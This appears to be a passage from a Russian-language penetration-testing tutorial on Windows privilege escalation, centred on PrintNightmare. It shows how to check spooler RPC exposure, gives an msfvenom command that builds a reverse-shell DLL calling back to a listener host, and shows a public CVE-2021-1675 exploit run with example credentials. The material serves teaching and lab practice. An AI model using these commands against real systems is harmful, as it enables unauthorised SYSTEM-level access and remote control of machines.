### Эксплуатация известных уязвимостей ОС Windows

Приведем пример некоторых достаточно популярных уязвимостей ОС, позволяющих повысить привилегии до максимальных:

    Уязвимость в установщике Windows (InstallerFileTakeOver (0day)
    Уязвимость в Windows Print Spooler (PrintNightmare)
    Уязвимость в планировщике задач Windows (MS10-092)
    Уязвимость в ядре Windows (MS16_014)
    Обработка вторичного входа в систему (MS16-032)

Для поиска известных уязвимостей в Windows для вашей версии ОС можно использовать как скрипты энумерации, так и ресурсы,
агрегирующие в себе подобную информацию (пример).

### Уязвимость в Windows Print Spooler (PrintNightmare)

Рассмотрим пример достаточно популярной уязвимости PrintNightmare, т.к. эта проблема до сих пор актуальна и может
встречаться в современных сетях компаний.

**Служба Windows Print Spooler** — это универсальный интерфейс между ОС, приложениями и локальными или сетевыми принтерами.
Она позволяет разработчикам приложений отправлять задания на печать.

**PrintNightmare** — это критическая уязвимость системы безопасности, затрагивающая операционную систему Microsoft Windows.
Есть два варианта ее эксплуатации: один разрешает удаленное выполнение кода, а другой ведет к повышению привилегий. Мы
рассмотрим вариант с повышением привилегий.

Поиск уязвимости

Для поиска уязвимости стоит обратиться к списку процессов. В списке процессов стоит обратить внимание на службу печати —
spoolsv:

Далее следует проверить, имеется ли доступ к данному сервису по TCP порту. Для этого можно удобно использовать утилиту
обращения к RPC сервисам Windows: rpcdump.py

>rpcdump.py @10.10.10.175 | egrep 'MS-RPRN|MS-PAR'

Эта команда выполняет две операции:

>rpcdump.py @10.10.10.175 — запускает утилиту rpcdump.py, которая использует протокол RPC (Remote Procedure Call) для
получения информации о доступных удаленных процедурах на хосте с IP-адресом 10.10.10.175.

>egrep 'MS-RPRN|MS-PAR' — фильтрует вывод утилиты rpcdump.py с помощью утилиты egrep, чтобы отобразить только строки,
содержащие "MS-RPRN" или "MS-PAR". Это позволяет отфильтровать информацию, связанную с протоколами Microsoft Remote

>Printing (MS-RPRN) и Microsoft Parallel Remote (MS-PAR), которые могут быть использованы для удаленного доступа к
принтерам и портам ввода-вывода соответственно.

Как работает уязвимость

Проблемы в службе печати Windows, приводящие к выполнению произвольного кода, не являются редким явлением.

Наиболее известная уязвимость в Windows, Print Spooler, используется в атаке Stuxnet: клиент использует вызов RPC для
добавления драйвера на сервер, сохраняя его в локальном или удаленном каталоге SMB.

Драйвер может содержать произвольный код, который будет выполняться на сервере с правами SYSTEM. Команду может выполнить
любой пользователь, прошедший аутентификацию в службе диспетчера очереди печати.

Другими словами — при наличии учетных данных пользователя появляется возможность выполнить любую DLL от имени SYSTEM.

Эксплуатация уязвимости

Для эксплуатации уязвимости необходимо подготовить DLL, которая будет загружена и исполнена, и воспользоваться
эксплойтом уязвимости.

DLL с “обратной оболочкой” можно создать при помощи msfvenom следующей командой:

>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1337 -f dll -o /tmp/print.dll

Для его использования в последствии необходимо либо выложить DLL на файловый сервер, который будет доступен машине
жертвы, либо загрузить его на машину жертвы.

Для эксплуатации уязвимости можно выбрать публичный эксплойт и выполнить его командой:

>python3 ./CVE-2021-1675.py example.local/Alex:HappyHacking@192.168.0.134 '\\192.168.0.177\share\print.dll'

Таким образом, могут быть получены права SYSTEM через уязвимость в Windows — Print Spooler. Критичность данной
уязвимости повышается ещё и благодаря тому, что служба Windows Print Spooler включена в Windows по умолчанию, что
потенциально расширяет применимость данного вектора.

